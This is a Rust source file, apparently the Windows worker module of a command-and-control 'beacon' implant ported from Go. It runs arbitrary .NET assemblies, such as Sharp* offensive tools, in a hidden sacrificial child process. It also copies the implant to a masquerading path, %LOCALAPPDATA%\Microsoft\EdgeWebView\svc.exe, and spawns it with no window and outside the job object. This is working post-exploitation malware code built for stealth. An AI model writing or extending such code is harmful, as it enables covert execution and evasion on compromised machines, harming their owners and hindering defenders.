//! Windows worker-process implementation.
//!
//! Replaces `worker_windows.go`. The parent process spawns itself as
//! a child with `TORNADO_WORKER=1` set and a set of env vars pointing
//! at three files: the base64-encoded assembly, the output capture
//! file, and the exit-code file. The child runs `run_worker()`, which
//! loads the assembly via `native::execute_dotnet_assembly_in_process`
//! and writes its result.
//!
//! # Why this pattern
//!
//! `Environment.Exit` in most Sharp* assemblies terminates the process
//! it is running in. Hosting the CLR in the beacon process would take
//! the beacon down with the target. The worker isolates the target's
//! teardown to a process the beacon does not depend on.
//!
//! # Worker detection
//!
//! Only the literal string `"1"` triggers worker mode. A build that
//! set `TORNADO_WORKER=true` would not become a worker — this matches
//! the Go tree, which uses `os.Getenv(envWorker) == "1"`.
//!
//! # Default worker path
//!
//! `%LOCALAPPDATA%\Microsoft\EdgeWebView\svc.exe`. A copy of the
//! beacon is staged there on first use; the copy is a full beacon
//! binary but never checks in, because its `run_worker` env var is
//! set when the parent spawns it.

use std::ffi::OsString;
use std::path::{Path, PathBuf};
use std::process::Stdio;

use base64::{engine::general_purpose::STANDARD, Engine as _};
use tempfile::TempDir;
use tokio::process::Command;

use crate::native;

// =====================================================================
// Environment variable names
// =====================================================================

const ENV_WORKER: &str = "TORNADO_WORKER";
const ENV_ASM_PATH: &str = "TORNADO_ASM_PATH";
const ENV_ARGS: &str = "TORNADO_ASM_ARGS";
const ENV_OUT_PATH: &str = "TORNADO_OUT_PATH";
const ENV_CODE_PATH: &str = "TORNADO_CODE_PATH";

// =====================================================================
// Windows process-creation flags
// =====================================================================

const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const CREATE_BREAKAWAY_FROM_JOB: u32 = 0x0100_0000;
const CREATE_NEW_PROCESS_GROUP: u32 = 0x0000_0200;

const WORKER_CREATION_FLAGS: u32 =
    CREATE_NO_WINDOW | CREATE_BREAKAWAY_FROM_JOB | CREATE_NEW_PROCESS_GROUP;

// =====================================================================
// Public API
// =====================================================================

/// Whether the current process is a worker.
///
/// Only `TORNADO_WORKER=1` triggers worker mode. Matches the Go
/// tree's strict comparison.
pub fn is_worker_mode() -> bool {
    std::env::var(ENV_WORKER).as_deref() == Ok("1")
}

/// Run the worker.
///
/// Reads the assembly path, args string, output path, and code path
/// from the worker env vars. Loads the assembly via the .NET
/// loader. Writes the captured output to `outPath` and the exit
/// code to `codePath` in the format `<n>|ok` or `<n>|<error>`.
///
/// Returns the process exit code, matching the Go tree's
/// `os.Exit(0|2|3)`:
///
/// - `0` — success; `codePath` has `<code>|ok`.
/// - `2` — read or base64 decode of the assembly file failed;
///   `codePath` has `-1|read asm: ...` or `-1|b64 decode: ...`.
/// - `3` — the .NET loader returned an error; `codePath` has
///   `-1|<error>`.
///
/// **The parent reads `codePath`, not this return value.** The
/// exit code is for logging and for shell-based debugging.
pub fn run_worker() -> i32 {
    let asm_path = std::env::var(ENV_ASM_PATH).unwrap_or_default();
    let args_string = std::env::var(ENV_ARGS).unwrap_or_default();
    let out_path = std::env::var(ENV_OUT_PATH).unwrap_or_default();
    let code_path = std::env::var(ENV_CODE_PATH).unwrap_or_default();

    // ---- Read and decode the assembly ----------------------
    let asm_b64 = match std::fs::read_to_string(&asm_path) {
        Ok(s) => s,
        Err(e) => {
            write_code(&code_path, &format!("-1|read asm: {e}"));
            return 2;
        }
    };
    let asm_bytes = match STANDARD.decode(asm_b64.trim()) {
        Ok(b) => b,
        Err(e) => {
            write_code(&code_path, &format!("-1|b64 decode: {e}"));
            return 2;
        }
    };

    // ---- Run the loader -----------------------------------
    //
    // The loader is synchronous. See `native/dotnet/mod.rs`.
    // The Go signature had two extra empty-string parameters
    // (`ExecuteDotNetAssemblyInProcess(asm, "", "", args)`); they
    // are unused and the Rust port omits them.
    let (out, code) =
        match native::execute_dotnet_assembly_in_process(
            &asm_bytes,
            &args_string,
        ) {
            Ok(r) => r,
            Err(e) => {
                let _ = std::fs::write(&out_path, b"");
                write_code(&code_path, &format!("-1|{e}"));
                return 3;
            }
        };

    // ---- Write the results --------------------------------
    let _ = std::fs::write(&out_path, out.as_bytes());
    write_code(&code_path, &format!("{code}|ok"));
    0
}

/// Spawn a worker, run the assembly in it, and collect the
/// output.
///
/// # Parameters
///
/// - `asm` — the raw .NET assembly bytes.
/// - `args_string` — the args the assembly will see as its
///   single-element `string[]`.
/// - `spawn_to` — the sacrificial worker binary. Empty means
///   "use the default path" (staged automatically on first use).
///
/// # Returns
///
/// `Ok((captured_output, exit_code))` on success. `exit_code` is
/// always `0` because the worker's own exit code is not
/// observable from a spawned subprocess in this port — the
/// parent reads the *assembly's* exit code from `codePath`.
/// `Err` names the specific failure — worker spawn, temp dir
/// creation, file write.
///
/// # Cancellation
///
/// `kill_on_drop(true)` ensures the child is killed when the
/// future is dropped (the caller's `dispatch::execute` wraps
/// this in `tokio::time::timeout`). The temp dir is cleaned up
/// by its `TempDir` guard.
pub async fn exec_assembly_out_of_process(
    asm: &[u8],
    args_string: &str,
    spawn_to: &str,
) -> Result<(String, i32), String> {
    let tmpdir = TempDir::new()
        .map_err(|e| format!("worker tmpdir: {e}"))?;
    let asm_path = tmpdir.path().join("a.b64");
    let out_path = tmpdir.path().join("o.txt");
    let code_path = tmpdir.path().join("c.txt");

    std::fs::write(&asm_path, STANDARD.encode(asm))
        .map_err(|e| format!("worker asm file: {e}"))?;

    let target = resolve_worker_binary(spawn_to)?;

    // ---- Spawn the worker ----------------------------------
    let mut cmd = Command::new(&target);
    cmd.env(ENV_WORKER, "1");
    cmd.env(ENV_ASM_PATH, &asm_path);
    cmd.env(ENV_ARGS, args_string);
    cmd.env(ENV_OUT_PATH, &out_path);
    cmd.env(ENV_CODE_PATH, &code_path);
    // Match `exec.Command`'s default: /dev/null for all three
    // standard streams (in the worker they are unused anyway,
    // because the .NET loader writes to files).
    cmd.stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null());
    // CREATE_NO_WINDOW | CREATE_BREAKAWAY_FROM_JOB |
    // CREATE_NEW_PROCESS_GROUP — matches the Go tree.
    cmd.creation_flags(WORKER_CREATION_FLAGS);
    // The caller's timeout (in `dispatch::execute`) cancels the
    // future; kill the child rather than leaking it.
    cmd.kill_on_drop(true);

    let mut child = cmd
        .spawn()
        .map_err(|e| format!("worker spawn: {e}"))?;

    // ---- Wait ------------------------------------------------
    //
    // No inner timeout: the outer `dispatch::execute` bounds the
    // wall clock, and `kill_on_drop` handles cancellation.
    // `wait()` on tokio's Child reaps the process; returning
    // `Result<ExitStatus>` — we do not inspect the worker's own
    // exit code (see module doc).
    child
        .wait()
        .await
        .map_err(|e| format!("worker wait: {e}"))?;

    // ---- Read results ---------------------------------------
    let out_bytes = std::fs::read(&out_path).unwrap_or_default();
    let code_bytes = std::fs::read(&code_path).unwrap_or_default();

    // Parse `<n>|ok` or `<n>|<error>`.
    let exit_code = if code_bytes.is_empty() {
        0
    } else {
        let s = String::from_utf8_lossy(&code_bytes);
        let s = s.trim();
        match s.find('|') {
            Some(i) => s[..i].parse::<i32>().unwrap_or(0),
            None => 0,
        }
    };

    Ok((
        String::from_utf8_lossy(&out_bytes).into_owned(),
        exit_code,
    ))
}

// =====================================================================
// Worker binary resolution
// =====================================================================

/// Resolve the worker binary path.
///
/// - If `spawn_to` is non-empty, it is used verbatim. Its
///   existence is checked; a missing path is an error.
/// - Otherwise, the default path under `%LOCALAPPDATA%` (or
///   `%USERPROFILE%\AppData\Local` if `LOCALAPPDATA` is unset) is
///   used. If that path does not exist, the current executable is
///   staged there.
fn resolve_worker_binary(spawn_to: &str) -> Result<PathBuf, String> {
    if !spawn_to.is_empty() {
        let p = Path::new(spawn_to);
        if !p.exists() {
            return Err(format!(
                "spawnto {spawn_to:?} does not exist on the target"
            ));
        }
        return Ok(p.to_path_buf());
    }

    let default_path = default_worker_path()?;

    if default_path.exists() {
        return Ok(default_path);
    }

    stage_self_at(&default_path).map_err(|e| {
        format!(
            "stage default worker at {default_path:?}: {e}"
        )
    })?;
    Ok(default_path)
}

/// Resolve the default worker path.
///
/// Prefers `LOCALAPPDATA`, then `USERPROFILE`. Both end up at the
/// same location on a standard Windows profile; LOCALAPPDATA is
/// tried first because it is the authoritative location when the
/// two diverge.
///
/// The Go tree only ever uses USERPROFILE (its `os.ExpandEnv`
/// does not expand `%VAR%` on Windows, so the check
/// `path == defaultWorkerPath` is always true and it falls
/// through to USERPROFILE). This port is functionally equivalent
/// — both variables point to the same `AppData\Local` directory
/// in practice — but tries LOCALAPPDATA first.
fn default_worker_path() -> Result<PathBuf, String> {
    if let Ok(base) = std::env::var("LOCALAPPDATA") {
        return Ok(PathBuf::from(base)
            .join("Microsoft")
            .join("EdgeWebView")
            .join("svc.exe"));
    }
    if let Ok(base) = std::env::var("USERPROFILE") {
        return Ok(PathBuf::from(base)
            .join("AppData")
            .join("Local")
            .join("Microsoft")
            .join("EdgeWebView")
            .join("svc.exe"));
    }
    Err(
        "cannot resolve default worker path: neither \
         LOCALAPPDATA nor USERPROFILE is set in the worker \
         environment"
            .to_string(),
    )
}

/// Copy the current executable to `dst`.
///
/// Creates parent directories as needed. On Windows, `std::fs::copy`
/// preserves the source's attributes; the target's executable bit
/// is implicit for `.exe` files. The Go tree used 0700 mode on
/// Unix; the Windows port does not need an explicit chmod.
fn stage_self_at(dst: &Path) -> Result<(), String> {
    if let Some(parent) = dst.parent() {
        std::fs::create_dir_all(parent)
            .map_err(|e| format!("create dir: {e}"))?;
    }

    let self_exe = std::env::current_exe()
        .map_err(|e| format!("locate self: {e}"))?;

    std::fs::copy(&self_exe, dst)
        .map_err(|e| format!("copy self: {e}"))?;

    Ok(())
}

/// Write `<text>` to `<path>`, ignoring errors.
///
/// The worker uses this for the code-path file. A failure to
/// write it is only a diagnostics problem — the parent will read
/// an empty file and treat it as exit code 0.
fn write_code(path: &str, text: &str) {
    let _ = std::fs::write(path, text.as_bytes());
}

// =====================================================================
// Silence unused warnings
// =====================================================================

// `OsString` is used by `Command::env`'s argument type but not
// spelled out in the body; keep the import to document the shape.
#[allow(dead_code)]
fn _env_type_marker(_: OsString) {}